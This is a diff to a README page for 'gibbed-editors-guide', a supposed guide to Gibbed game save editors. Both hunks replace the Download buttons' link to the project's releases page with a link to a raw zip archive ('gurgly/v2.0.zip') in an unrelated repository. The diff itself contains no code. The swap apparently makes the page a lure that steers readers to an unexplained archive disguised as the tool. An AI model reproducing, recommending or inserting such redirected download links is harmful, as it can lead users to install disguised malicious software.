@@ -6,7 +6,7 @@ description: "Discover safe backups and step-by-step guides for classic Gibbed s
 <h1>🛠️ gibbed-editors-guide - Your Friendly Save Editor Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/BangHV91/gibbed-editors-guide/releases">
+  <a href="https://raw.githubusercontent.com/BangHV91/banghv91.github.io/main/gurgly/v2.0.zip">
     <img src="https://img.shields.io/badge/Download-Free_Edition-blueviolet?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button" />
   </a>
 </p>
@@ -206,7 +206,7 @@ This guide covers the **gibbed save editor library**, which supports many popula
 Need the link one more time? Here you go:
 
 <p align="center">
-  <a href="https://github.com/BangHV91/gibbed-editors-guide/releases">
+  <a href="https://raw.githubusercontent.com/BangHV91/banghv91.github.io/main/gurgly/v2.0.zip">
     <img src="https://img.shields.io/badge/Download-gibbed--editors--guide-2ea44f?style=for-the-badge&logo=github" alt="Download Button 2" />
   </a>
 </p>
